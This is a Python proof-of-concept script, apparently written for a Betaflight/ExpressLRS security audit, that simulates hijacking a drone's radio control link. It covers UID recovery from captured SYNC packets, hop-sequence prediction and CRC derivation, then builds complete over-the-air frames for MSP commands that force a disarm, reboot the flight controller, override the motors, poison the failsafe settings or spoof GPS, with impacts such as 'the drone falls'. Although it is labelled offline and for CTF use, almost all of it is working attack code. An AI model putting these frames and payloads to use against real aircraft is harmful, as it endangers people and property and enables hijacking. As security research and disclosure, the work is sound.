#!/usr/bin/env python3
"""
MSP-over-ELRS Session Hijack PoC — end-to-end attack simulation.

Demonstrates the complete ELRS session hijack chain identified in the
Betaflight 4.4.2 vulnerability audit (PR #34):

  1. SYNC capture   — extract UID[3:5] from observed SYNC packets
  2. UID recovery    — complete UID via rainbow table or brute force
  3. FHSS prediction — derive the full 240-channel hop sequence
  4. CRC derivation  — compute the v3 CRC14 initializer from UID
  5. Connection sim  — simulate the ELRS connection state machine
  6. MSP injection   — build and schedule MSP attack packets

All operations are offline/simulated. No RF is transmitted, no hardware
is accessed, no live target is contacted.

The simulation models timing constraints at 150 Hz packet rate (6.667 ms
per slot) and the 4-packets-per-hop FHSS advance used by the TinyHawk III.

Requires: Python 3.10+, no external dependencies.

Usage:
    # Full hijack simulation with default binding phrase
    python3 msp-elrs-hijack-poc.py --phrase "iloveflying"

    # With rainbow table for UID recovery
    python3 msp-elrs-hijack-poc.py --rainbow tools/elrs-rainbow-table.json

    # Simulate specific attack after hijack
    python3 msp-elrs-hijack-poc.py --phrase "iloveflying" --attack force-disarm

    # Show timing analysis
    python3 msp-elrs-hijack-poc.py --phrase "iloveflying" --timing

For CTF research and authorized security testing only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import struct
import sys
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Sequence

# ---------------------------------------------------------------------------
# Add tools/ to path for elrs_core imports
# ---------------------------------------------------------------------------
_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)

from elrs_core.v3_compat import (
    v3_crc14,
    v3_uid_crc_init,
    v3_uid_seed,
    v3_build_sequence,
    v3_sync_channel,
    v3_generate_crc,
    v3_decode_sync,
    v3_build_sync,
    V3Sync,
)
from elrs_core.fhss import FHSS_SEQUENCE_LEN


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PACKET_RATE_HZ = 150
SLOT_PERIOD_MS = 1000.0 / PACKET_RATE_HZ  # 6.667 ms
HOP_INTERVAL = 4  # packets per FHSS hop (v3 150 Hz)
FREQ_COUNT = 80   # 2.4 GHz channel count
SYNC_CHANNEL = v3_sync_channel(FREQ_COUNT)  # channel 41

# ELRS connection timeouts (from expresslrs.c)
SYNC_TIMEOUT_MS = 250       # tentativeConnection timeout
CONN_TIMEOUT_MS = 1500      # fully connected timeout
RX_SIGNAL_TIMEOUT_MS = 100  # generic RX signal loss


# ---------------------------------------------------------------------------
# ELRS Connection State Machine (from expresslrs.c)
# ---------------------------------------------------------------------------
class ConnectionState(Enum):
    DISCONNECTED = auto()
    TENTATIVE = auto()
    CONNECTED = auto()


@dataclass
class ElrsConnectionSim:
    """Simulates the ELRS receiver connection state machine."""
    state: ConnectionState = ConnectionState.DISCONNECTED
    nonce: int = 0
    fhss_index: int = 0
    model_match: bool = False
    last_sync_ms: float = 0.0
    last_valid_ms: float = 0.0
    packets_since_sync: int = 0

    def process_sync(self, sync: V3Sync, uid: bytes, now_ms: float) -> str:
        """Process a received SYNC packet. Returns state transition description."""
        if not sync.uid_matches(uid):
            return "SYNC rejected: UID mismatch"

        self.nonce = sync.nonce
        self.fhss_index = sync.fhss_index
        self.last_sync_ms = now_ms
        self.last_valid_ms = now_ms
        self.packets_since_sync = 0

        if self.state == ConnectionState.DISCONNECTED:
            self.state = ConnectionState.TENTATIVE
            return "DISCONNECTED -> TENTATIVE (SYNC accepted)"
        elif self.state == ConnectionState.TENTATIVE:
            self.state = ConnectionState.CONNECTED
            self.model_match = True  # modelId 0xFF -> always match
            return "TENTATIVE -> CONNECTED (second SYNC, model match)"
        else:
            return "CONNECTED (SYNC refresh)"

    def process_data(self, now_ms: float) -> str:
        """Process a valid DATA/RC packet (CRC passed)."""
        if self.state == ConnectionState.DISCONNECTED:
            return "DATA ignored: not connected"

        self.last_valid_ms = now_ms
        self.packets_since_sync += 1
        self.nonce = (self.nonce + 1) & 0xFF
        return f"DATA accepted (nonce={self.nonce}, hop_idx={self.fhss_index})"

    def check_timeout(self, now_ms: float) -> str | None:
        """Check for connection timeout. Returns message if state changed."""
        if self.state == ConnectionState.TENTATIVE:
            if now_ms - self.last_sync_ms > SYNC_TIMEOUT_MS:
                self.state = ConnectionState.DISCONNECTED
                return "TENTATIVE -> DISCONNECTED (sync timeout)"
        elif self.state == ConnectionState.CONNECTED:
            if now_ms - self.last_valid_ms > CONN_TIMEOUT_MS:
                self.state = ConnectionState.DISCONNECTED
                return "CONNECTED -> DISCONNECTED (connection timeout)"
        return None

    @property
    def can_inject_msp(self) -> bool:
        return self.state == ConnectionState.CONNECTED and self.model_match


# ---------------------------------------------------------------------------
# UID recovery simulation
# ---------------------------------------------------------------------------
def uid_from_phrase(phrase: str) -> bytes:
    """Derive UID from binding phrase (MD5 hash, first 6 bytes)."""
    return hashlib.md5(phrase.encode()).digest()[:6]


def extract_uid_from_sync(sync: V3Sync) -> dict:
    """Extract partial UID from a captured SYNC packet."""
    return {
        "uid3": sync.uid3,
        "uid4": sync.uid4,
        "uid5_upper2": (sync.uid5 >> 6) & 0x03,
        "uid5_lower6_xor_model": sync.uid5 & 0x3F,
        "known_bytes": f"??:??:??:{sync.uid3:02x}:{sync.uid4:02x}:{sync.uid5:02x}",
        "bits_recovered": 18,
        "bits_remaining": 30,
    }


def rainbow_lookup(partial_uid: dict, rainbow_path: str) -> bytes | None:
    """Look up UID in rainbow table using partial SYNC data."""
    try:
        with open(rainbow_path) as f:
            table = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return None

    for entry in table:
        uid_hex = entry.get("uid", "")
        if len(uid_hex) != 12:
            continue
        uid = bytes.fromhex(uid_hex)
        if (uid[3] == partial_uid["uid3"] and
            uid[4] == partial_uid["uid4"] and
            (uid[5] & 0xC0) == (partial_uid["uid5_upper2"] << 6)):
            return uid
    return None


def brute_force_uid_sim(partial_uid: dict) -> dict:
    """Estimate brute force effort for remaining UID bits."""
    remaining_bits = partial_uid["bits_remaining"]
    search_space = 2 ** remaining_bits
    # At ~1M hashes/sec on a modern CPU
    est_seconds = search_space / 1_000_000
    return {
        "remaining_bits": remaining_bits,
        "search_space": search_space,
        "estimated_time_sec": est_seconds,
        "estimated_time_human": (
            f"{est_seconds:.0f}s" if est_seconds < 60
            else f"{est_seconds/60:.0f}m" if est_seconds < 3600
            else f"{est_seconds/3600:.1f}h"
        ),
        "feasible": est_seconds < 86400,
    }


# ---------------------------------------------------------------------------
# MSP command building (from msp-injection-sim.py, focused subset)
# ---------------------------------------------------------------------------
MSP_HEADER = b"$M"
MSP_DIR_TO_FC = b"<"

MSP_REBOOT = 68
MSP_SET_FAILSAFE_CONFIG = 76
MSP_SET_RAW_RC = 200
MSP_SET_RAW_GPS = 201
MSP_SET_MOTOR = 214
MSP_SET_ARMING_DISABLED = 251
MSP_API_VERSION = 1

CRSF_FRAMETYPE_MSP_REQ = 0x7A
CRSF_FRAMETYPE_MSP_WRITE = 0x7C
CRSF_ADDRESS_FC = 0xC8
CRSF_ADDRESS_TX = 0xEA


def msp_checksum(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
    return crc


def build_msp_command(cmd: int, payload: bytes = b"") -> bytes:
    body = bytes([len(payload), cmd]) + payload
    return MSP_HEADER + MSP_DIR_TO_FC + body + bytes([msp_checksum(body)])


def crsf_crc8(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0xD5) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def build_crsf_msp_frame(cmd: int, payload: bytes = b"") -> bytes:
    msp_inner = bytes([0x00, 0x00, cmd, len(payload)]) + payload
    frame_payload = bytes([CRSF_ADDRESS_FC, CRSF_ADDRESS_TX]) + msp_inner
    frame_type = CRSF_FRAMETYPE_MSP_WRITE if payload else CRSF_FRAMETYPE_MSP_REQ
    frame_body = bytes([frame_type]) + frame_payload
    crc = crsf_crc8(frame_body)
    return bytes([CRSF_ADDRESS_FC, len(frame_body) + 1, *frame_body, crc])


# ---------------------------------------------------------------------------
# ELRS DATA packet framing
# ---------------------------------------------------------------------------
ELRS_DATA_BYTES = 5  # usable bytes per v3 std DATA packet


def split_crsf_to_elrs_packets(crsf_frame: bytes) -> list[bytes]:
    """Split CRSF frame into 5-byte ELRS DATA packet payloads."""
    chunks: list[bytes] = []
    offset = 0
    seq = 0
    while offset < len(crsf_frame):
        remaining = len(crsf_frame) - offset
        is_last = remaining <= (ELRS_DATA_BYTES - 1)
        header = seq & 0x0F
        if not is_last:
            header |= 0x80
        chunk = bytes([header]) + crsf_frame[offset:offset + ELRS_DATA_BYTES - 1]
        if len(chunk) < ELRS_DATA_BYTES:
            chunk += b"\x00" * (ELRS_DATA_BYTES - len(chunk))
        chunks.append(chunk)
        offset += ELRS_DATA_BYTES - 1
        seq += 1
    return chunks


def build_elrs_data_frame(data_payload: bytes, uid: bytes,
                          nonce: int = 0) -> bytearray:
    """Build a complete 8-byte v3 DATA frame with CRC14."""
    frame = bytearray(8)
    frame[0] = 0x01  # type = DATA
    frame[1:6] = data_payload[:5]
    # Bytes 6-7 will be switch data + CRC; for MSP DATA, switch byte = 0
    frame[6] = 0x00
    frame[7] = 0x00
    v3_generate_crc(frame, uid)
    return frame


# ---------------------------------------------------------------------------
# Attack definitions
# ---------------------------------------------------------------------------
@dataclass
class HijackAttack:
    name: str
    description: str
    msp_cmd: int
    msp_payload: bytes
    impact: str
    elrs_packets_needed: int = 0

    def __post_init__(self):
        crsf = build_crsf_msp_frame(self.msp_cmd, self.msp_payload)
        self.elrs_packets_needed = len(split_crsf_to_elrs_packets(crsf))


def get_attacks() -> dict[str, HijackAttack]:
    attacks = {}

    attacks["force-disarm"] = HijackAttack(
        name="force-disarm",
        description="Force immediate disarm via MSP_SET_ARMING_DISABLED",
        msp_cmd=MSP_SET_ARMING_DISABLED,
        msp_payload=bytes([1, 0, 0, 0]),
        impact="Immediate motor shutdown. If armed and flying, the drone falls.",
    )

    attacks["reboot"] = HijackAttack(
        name="reboot",
        description="Force FC reboot via MSP_REBOOT",
        msp_cmd=MSP_REBOOT,
        msp_payload=bytes([0]),
        impact="Flight controller reboots. Instant loss of motor control.",
    )

    motor_payload = bytearray()
    for i in range(8):
        motor_payload += struct.pack("<H", 1000 if i < 4 else 0)
    attacks["motor-override"] = HijackAttack(
        name="motor-override",
        description="Direct motor control via MSP_SET_MOTOR",
        msp_cmd=MSP_SET_MOTOR,
        msp_payload=bytes(motor_payload),
        impact="Motor values overwritten. Works even while disarmed (no ARMED check).",
    )

    attacks["failsafe-poison"] = HijackAttack(
        name="failsafe-poison",
        description="Rewrite failsafe to DROP with zero delay",
        msp_cmd=MSP_SET_FAILSAFE_CONFIG,
        msp_payload=bytes([0, 0]) + struct.pack("<H", 1000) + bytes([0]) + struct.pack("<H", 0) + bytes([0]),
        impact="Next signal loss triggers instant motor cutoff instead of GPS rescue.",
    )

    gps_payload = bytearray()
    gps_payload += bytes([1, 12])   # fix=GPS_FIX, sats=12
    gps_payload += struct.pack("<i", 389500000)   # lat 38.95
    gps_payload += struct.pack("<i", -770500000)  # lon -77.05
    gps_payload += struct.pack("<H", 100)         # alt 100m
    gps_payload += struct.pack("<H", 0)           # speed 0
    attacks["gps-poison"] = HijackAttack(
        name="gps-poison",
        description="Inject false GPS coordinates via MSP_SET_RAW_GPS",
        msp_cmd=MSP_SET_RAW_GPS,
        msp_payload=bytes(gps_payload),
        impact="GPS rescue redirected to attacker-chosen location.",
    )

    attacks["canary"] = HijackAttack(
        name="canary",
        description="Read-only MSP_API_VERSION probe (safe test)",
        msp_cmd=MSP_API_VERSION,
        msp_payload=b"",
        impact="No state change. Confirms MSP-over-ELRS command delivery.",
    )

    return attacks


# ---------------------------------------------------------------------------
# Hijack simulation
# ---------------------------------------------------------------------------
@dataclass
class HijackSimResult:
    uid: bytes
    crc_init: int
    fhss_seed: int
    sync_channel: int
    fhss_sequence_len: int
    connection_log: list[str] = field(default_factory=list)
    attack_plan: dict | None = None
    timing: dict | None = None


def run_hijack_simulation(
    uid: bytes,
    attack_name: str = "canary",
    show_timing: bool = False,
) -> HijackSimResult:
    """Run a complete hijack simulation."""

    crc_init = v3_uid_crc_init(uid)
    seed = v3_uid_seed(uid)
    sync_ch = v3_sync_channel(FREQ_COUNT)
    fhss_seq = v3_build_sequence(uid, FREQ_COUNT)

    result = HijackSimResult(
        uid=uid,
        crc_init=crc_init,
        fhss_seed=seed,
        sync_channel=sync_ch,
        fhss_sequence_len=len(fhss_seq),
    )

    # Phase 1: Simulate SYNC capture on the sync channel
    conn = ElrsConnectionSim()
    sim_time = 0.0

    # Build a SYNC packet as if captured
    initial_nonce = 42
    initial_fhss = 0
    sync_frame = v3_build_sync(uid, initial_fhss, initial_nonce)
    sync_decoded = v3_decode_sync(sync_frame)

    result.connection_log.append(
        f"[{sim_time:.1f}ms] Captured SYNC on ch {sync_ch}: "
        f"nonce={sync_decoded.nonce}, fhss_idx={sync_decoded.fhss_index}"
    )

    # Phase 2: Process first SYNC -> TENTATIVE
    msg = conn.process_sync(sync_decoded, uid, sim_time)
    result.connection_log.append(f"[{sim_time:.1f}ms] {msg}")

    # Advance to next SYNC opportunity (every 80 hops * 4 packets/hop = 320 packets)
    sync_interval_slots = FREQ_COUNT * HOP_INTERVAL
    sync_interval_ms = sync_interval_slots * SLOT_PERIOD_MS
    sim_time += sync_interval_ms

    # Phase 3: Second SYNC -> CONNECTED
    next_nonce = (initial_nonce + sync_interval_slots) & 0xFF
    sync2_frame = v3_build_sync(uid, 0, next_nonce)
    sync2_decoded = v3_decode_sync(sync2_frame)
    msg = conn.process_sync(sync2_decoded, uid, sim_time)
    result.connection_log.append(
        f"[{sim_time:.1f}ms] Second SYNC: {msg}"
    )

    # Phase 4: Inject MSP command
    attacks = get_attacks()
    attack = attacks.get(attack_name, attacks["canary"])

    crsf = build_crsf_msp_frame(attack.msp_cmd, attack.msp_payload)
    elrs_chunks = split_crsf_to_elrs_packets(crsf)

    # Build the OTA frames
    ota_frames = []
    current_nonce = next_nonce
    for i, chunk in enumerate(elrs_chunks):
        current_nonce = (current_nonce + 1) & 0xFF
        ota = build_elrs_data_frame(chunk, uid, current_nonce)
        ota_frames.append(ota)
        sim_time += SLOT_PERIOD_MS
        fhss_slot = (conn.fhss_index * HOP_INTERVAL + conn.packets_since_sync + i) % len(fhss_seq)
        channel = fhss_seq[fhss_slot % len(fhss_seq)]
        msg = conn.process_data(sim_time)
        result.connection_log.append(
            f"[{sim_time:.1f}ms] MSP DATA [{i+1}/{len(elrs_chunks)}] "
            f"on ch {channel}: {msg}"
        )

    injection_time_ms = len(elrs_chunks) * SLOT_PERIOD_MS

    result.attack_plan = {
        "attack": attack.name,
        "description": attack.description,
        "impact": attack.impact,
        "msp_cmd": attack.msp_cmd,
        "msp_payload_hex": attack.msp_payload.hex(),
        "msp_frame_hex": build_msp_command(attack.msp_cmd, attack.msp_payload).hex(),
        "crsf_frame_hex": crsf.hex(),
        "crsf_frame_len": len(crsf),
        "elrs_packets_needed": len(elrs_chunks),
        "injection_time_ms": round(injection_time_ms, 1),
        "ota_frames": [f.hex() for f in ota_frames],
    }

    result.connection_log.append(
        f"[{sim_time:.1f}ms] MSP command delivered: {attack.name} "
        f"({len(elrs_chunks)} packets, {injection_time_ms:.1f} ms)"
    )

    if show_timing:
        result.timing = compute_timing_analysis(uid, attacks)

    return result


def compute_timing_analysis(uid: bytes, attacks: dict[str, HijackAttack]) -> dict:
    """Compute timing for all attacks at the target's packet rate."""
    sync_interval_ms = FREQ_COUNT * HOP_INTERVAL * SLOT_PERIOD_MS

    analysis = {
        "packet_rate_hz": PACKET_RATE_HZ,
        "slot_period_ms": round(SLOT_PERIOD_MS, 3),
        "hop_interval_packets": HOP_INTERVAL,
        "sync_interval_ms": round(sync_interval_ms, 1),
        "connection_setup_ms": round(sync_interval_ms, 1),
        "attacks": {},
    }

    for name, attack in attacks.items():
        inject_ms = attack.elrs_packets_needed * SLOT_PERIOD_MS
        total_ms = sync_interval_ms + inject_ms
        analysis["attacks"][name] = {
            "packets": attack.elrs_packets_needed,
            "injection_ms": round(inject_ms, 1),
            "total_from_first_sync_ms": round(total_ms, 1),
        }

    return analysis


# ---------------------------------------------------------------------------
# Output formatting
# ---------------------------------------------------------------------------
def print_result(result: HijackSimResult, verbose: bool = False) -> None:
    print(f"\n{'='*65}")
    print("MSP-over-ELRS Session Hijack Simulation")
    print(f"{'='*65}")

    print(f"\n  Target UID:     {result.uid.hex()}")
    print(f"  CRC14 init:     0x{result.crc_init:04X}")
    print(f"  FHSS seed:      0x{result.fhss_seed:08X}")
    print(f"  Sync channel:   {result.sync_channel}")
    print(f"  FHSS seq len:   {result.fhss_sequence_len}")

    print(f"\n--- Connection State Machine ---")
    for entry in result.connection_log:
        print(f"  {entry}")

    if result.attack_plan:
        plan = result.attack_plan
        print(f"\n--- Attack Plan: {plan['attack']} ---")
        print(f"  Description:  {plan['description']}")
        print(f"  Impact:       {plan['impact']}")
        print(f"  MSP cmd:      {plan['msp_cmd']}")
        print(f"  CRSF frame:   {plan['crsf_frame_len']} bytes")
        print(f"  ELRS packets: {plan['elrs_packets_needed']}")
        print(f"  Inject time:  {plan['injection_time_ms']} ms")

        if verbose:
            print(f"\n  MSP frame:    {plan['msp_frame_hex']}")
            print(f"  CRSF frame:   {plan['crsf_frame_hex']}")
            for i, frame in enumerate(plan['ota_frames']):
                print(f"  OTA [{i}]:      {frame}")

    if result.timing:
        t = result.timing
        print(f"\n--- Timing Analysis ({t['packet_rate_hz']} Hz) ---")
        print(f"  Slot period:        {t['slot_period_ms']} ms")
        print(f"  Hop interval:       {t['hop_interval_packets']} packets")
        print(f"  Sync interval:      {t['sync_interval_ms']} ms")
        print(f"  Connection setup:   {t['connection_setup_ms']} ms")
        print(f"\n  {'Attack':<20s} {'Pkts':>5s} {'Inject':>9s} {'Total':>9s}")
        print(f"  {'-'*20} {'-'*5} {'-'*9} {'-'*9}")
        for name, info in t["attacks"].items():
            print(f"  {name:<20s} {info['packets']:>5d} "
                  f"{info['injection_ms']:>7.1f}ms "
                  f"{info['total_from_first_sync_ms']:>7.1f}ms")

    print(f"\n{'='*65}")
    print("SIMULATION ONLY — no RF transmitted, no hardware accessed")
    print(f"{'='*65}\n")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="MSP-over-ELRS session hijack PoC (offline simulation)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.",
    )
    parser.add_argument("--phrase", default="iloveflying",
                        help="Binding phrase to derive UID (default: iloveflying)")
    parser.add_argument("--uid", help="Direct UID hex (12 chars, overrides --phrase)")
    parser.add_argument("--rainbow", help="Path to rainbow table JSON for UID lookup")
    parser.add_argument("--attack", default="canary",
                        choices=list(get_attacks().keys()),
                        help="Attack to simulate after hijack (default: canary)")
    parser.add_argument("--timing", action="store_true",
                        help="Show timing analysis for all attacks")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Show full packet hex dumps")
    parser.add_argument("--list-attacks", action="store_true",
                        help="List available attacks and exit")

    args = parser.parse_args()

    if args.list_attacks:
        print("\nAvailable attacks:\n")
        for name, attack in get_attacks().items():
            print(f"  {name:<20s} {attack.description}")
            print(f"  {'':20s} Impact: {attack.impact}")
            print(f"  {'':20s} ELRS packets: {attack.elrs_packets_needed}")
            print()
        return

    # Determine UID
    if args.uid:
        uid = bytes.fromhex(args.uid)
        print(f"Using direct UID: {uid.hex()}", file=sys.stderr)
    else:
        uid = uid_from_phrase(args.phrase)
        print(f"Derived UID from phrase {args.phrase!r}: {uid.hex()}",
              file=sys.stderr)

    # Simulate SYNC capture and partial UID extraction
    sync_frame = v3_build_sync(uid, 0, 42)
    sync_decoded = v3_decode_sync(sync_frame)
    partial = extract_uid_from_sync(sync_decoded)

    print(f"\nSYNC capture → partial UID: {partial['known_bytes']}", file=sys.stderr)
    print(f"  Bits recovered: {partial['bits_recovered']}/48", file=sys.stderr)

    if args.rainbow:
        recovered = rainbow_lookup(partial, args.rainbow)
        if recovered:
            print(f"  Rainbow table hit: {recovered.hex()}", file=sys.stderr)
        else:
            print("  Rainbow table: no match", file=sys.stderr)
            brute = brute_force_uid_sim(partial)
            print(f"  Brute force estimate: {brute['estimated_time_human']} "
                  f"({brute['search_space']:,} candidates)", file=sys.stderr)
    else:
        brute = brute_force_uid_sim(partial)
        print(f"  Brute force estimate: {brute['estimated_time_human']} "
              f"({brute['search_space']:,} candidates)", file=sys.stderr)

    # Run full hijack simulation
    result = run_hijack_simulation(uid, args.attack, args.timing)
    print_result(result, args.verbose)


if __name__ == "__main__":
    main()
